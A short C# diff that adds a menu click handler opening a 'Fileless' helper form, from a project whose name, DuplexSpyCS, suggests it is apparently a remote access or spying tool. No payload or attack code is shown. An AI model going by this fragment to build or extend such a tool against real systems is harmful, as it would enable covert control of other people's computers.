@@ -307,5 +307,10 @@ namespace DuplexSpyCS
         {
             fnInit();
         }
+
+        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\Fileless").Show();
+        }
     }
 }
